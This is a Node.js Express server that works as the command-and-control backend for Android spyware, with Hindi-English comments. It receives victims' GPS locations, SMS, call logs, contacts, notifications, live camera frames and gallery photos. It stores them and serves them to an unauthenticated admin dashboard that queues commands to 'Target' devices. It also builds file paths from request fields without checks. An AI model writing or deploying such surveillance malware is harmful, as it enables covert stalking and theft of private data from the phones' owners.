const express = require('express');
const fs = require('fs');
const path = require('path');
const cors = require('cors');
const bodyParser = require('body-parser');

const app = express();
const PORT = process.env.PORT || 3000;

// --- 1. Storage Setup ---
const UPLOADS_DIR = path.join(__dirname, 'uploads');
if (!fs.existsSync(UPLOADS_DIR)) fs.mkdirSync(UPLOADS_DIR);

// --- 2. Middleware ---
app.use(cors());
// Image upload ke liye limit badhai hai (50mb)
app.use(bodyParser.json({ limit: '50mb' }));
app.use(bodyParser.urlencoded({ limit: '50mb', extended: true }));
app.use(express.static(__dirname)); // Static files (HTML) serve karne ke liye

// --- 3. Live RAM Memory (Device Status) ---
let devicesStatus = {}; 

// ==================================================
// 📲 PHONE SIDE API (Android yahan data bhejega)
// ==================================================

// 1. HEARTBEAT / STATUS UPDATE (🔥 UPDATED: Location Added)
app.post('/api/status', (req, res) => {
    // Lat/Lon receive kiya
    let { device_id, model, battery, version, charging, lat, lon } = req.body;
    
    // Safety Check
    if (!device_id) return res.status(400).json({ error: "No ID provided" });

    const id = device_id.toString().trim().toUpperCase();

    // Check agar koi COMMAND pending hai is phone ke liye
    const pendingCommand = (devicesStatus[id] && devicesStatus[id].command) ? devicesStatus[id].command : "none";

    // Location Map Link Generator
    let mapLink = "#";
    if (lat && lon && lat !== 0.0) {
        mapLink = `https://www.google.com/maps/search/?api=1&query=${lat},${lon}`;
    }

    // Update RAM
    devicesStatus[id] = {
        id: id,
        model: model || "Unknown Device",
        battery: battery || 0,
        version: version || "--",
        charging: (charging === 'true' || charging === true),
        lat: lat || 0,   // 🔥 Location Saved
        lon: lon || 0,   // 🔥 Location Saved
        mapLink: mapLink, // 🔥 Map Link Saved
        lastSeen: Date.now(),
        command: "none" // Command delivered, now reset
    };

    console.log(`📡 [PING] ${id} | Bat: ${battery}% | Loc: ${lat},${lon}`);
    res.json({ status: "success", command: pendingCommand });
});

// 2. DATA UPLOAD (SMS, Notifications, Contacts, Logs) - (Pehle jaisa hi hai)
app.post('/api/upload_data', (req, res) => {
    let { device_id, type, data } = req.body;
    if (!device_id) return res.status(400).json({ error: "No ID" });

    const id = device_id.toString().trim().toUpperCase();
    const filePath = path.join(UPLOADS_DIR, `${id}_${type}.json`);

    try {
        let parsedData = typeof data === 'string' ? JSON.parse(data) : data;
        
        const historyTypes = ['notifications', 'sms', 'call_logs', 'contacts'];
        
        if (historyTypes.includes(type)) {
            let existingData = [];
            if (fs.existsSync(filePath)) {
                try { 
                    existingData = JSON.parse(fs.readFileSync(filePath, 'utf8')); 
                } catch (e) { 
                    existingData = []; 
                }
            }
            if (!Array.isArray(existingData)) existingData = [];

            // 🔥 MERGE LOGIC (Preserved): [New Data, ...Old Data]
            const newDataArray = Array.isArray(parsedData) ? parsedData : [parsedData];
            const finalData = [...newDataArray, ...existingData];
            
            // File size control (Last 1000 items only)
            fs.writeFileSync(filePath, JSON.stringify(finalData.slice(0, 1000), null, 2));
        } else {
            // Other files replace logic
            fs.writeFileSync(filePath, JSON.stringify(parsedData, null, 2));
        }

        console.log(`📥 [UPLOAD] ${type} saved for ${id}`);
        res.json({ status: "success" });
    } catch (error) {
        console.error(`❌ Upload Error [${id}]:`, error.message);
        res.status(500).json({ status: "error" });
    }
});

// 3. CAMERA FRAME UPLOAD (Pehle jaisa)
app.post('/api/upload_frame', (req, res) => {
    let { device_id, image_data } = req.body;
    if (!device_id || !image_data) return res.status(400).json({ error: "Missing Data" });

    const id = device_id.toString().trim().toUpperCase();
    const filePath = path.join(UPLOADS_DIR, `${id}_cam.json`);

    try {
        const payload = {
            time: Date.now(),
            image: image_data // Base64 String
        };
        
        fs.writeFileSync(filePath, JSON.stringify(payload, null, 2));
        console.log(`📸 [CAMERA] Frame received from ${id}`);
        res.json({ status: "success" });
    } catch (error) {
        console.error(`❌ Cam Error: ${error.message}`);
        res.status(500).json({ error: "Failed" });
    }
});

// 4. 🔥 GALLERY UPLOAD (NEW: Ye add kiya hai)
app.post('/api/upload_gallery', (req, res) => {
    let { device_id, image_data, date } = req.body;
    if (!device_id || !image_data || !date) return res.status(400).json({ error: "Missing Data" });

    const id = device_id.toString().trim().toUpperCase();
    const filePath = path.join(UPLOADS_DIR, `${id}_gallery.json`);

    try {
        let galleryData = [];
        // Load old gallery data
        if (fs.existsSync(filePath)) {
            try { galleryData = JSON.parse(fs.readFileSync(filePath, 'utf8')); } catch (e) {}
        }
        if (!Array.isArray(galleryData)) galleryData = [];

        // 🔥 DUPLICATE CHECK: Agar same timestamp wali photo hai, to skip karo
        const isDuplicate = galleryData.some(photo => photo.time === date);

        if (isDuplicate) {
            console.log(`⚠️ [GALLERY] Duplicate skipped for ${id}`);
            return res.json({ status: "skipped" });
        }

        // Add New Photo to TOP
        galleryData.unshift({
            time: date,
            uploadedAt: Date.now(),
            image: image_data // Base64
        });

        // Limit size (Max 200 photos taaki file corrupt na ho)
        if (galleryData.length > 200) {
            galleryData = galleryData.slice(0, 200);
        }

        fs.writeFileSync(filePath, JSON.stringify(galleryData, null, 2));
        console.log(`🖼️ [GALLERY] Photo Saved for ${id}`);
        res.json({ status: "success" });

    } catch (error) {
        console.error(`❌ Gallery Error: ${error.message}`);
        res.status(500).json({ error: "Failed" });
    }
});

// ==================================================
// 💻 DASHBOARD / ADMIN API
// ==================================================

// Get List of All Active Devices
app.get('/api/admin/all-devices', (req, res) => {
    res.json(devicesStatus);
});

// Get Specific Device Status
app.get('/api/device-status/:id', (req, res) => {
    const id = req.params.id.toUpperCase().trim();
    const device = devicesStatus[id];

    if (!device) {
        return res.json({ id: id, isOnline: false, model: "Waiting..." });
    }

    const isOnline = (Date.now() - device.lastSeen) < 60000;
    res.json({ ...device, isOnline });
});

// Send Command
app.post('/api/send-command', (req, res) => {
    let { device_id, command } = req.body;
    if (!device_id || !command) return res.status(400).json({ error: "Missing ID or Cmd" });

    const id = device_id.toUpperCase().trim();
    
    if (!devicesStatus[id]) {
        devicesStatus[id] = { id: id, model: "Target", lastSeen: 0 };
    }
    
    devicesStatus[id].command = command;
    console.log(`🚀 [CMD QUEUED] ${command} -> ${id}`);
    res.json({ status: "success", target: id });
});

// Get JSON Data Files (Modified to support gallery)
app.get('/api/get-data/:device_id/:type', (req, res) => {
    const id = req.params.device_id.toUpperCase().trim();
    const type = req.params.type; // notifications, sms, gallery, etc.
    const filePath = path.join(UPLOADS_DIR, `${id}_${type}.json`);

    if (fs.existsSync(filePath)) {
        res.sendFile(filePath);
    } else {
        res.json([]);
    }
});

// --- Start Server ---
app.listen(PORT, () => {
    console.log(`🔥 CYBER-SERVER RUNNING ON PORT ${PORT}`);
    console.log(`📂 SAVING DATA TO: ${UPLOADS_DIR}`);
});
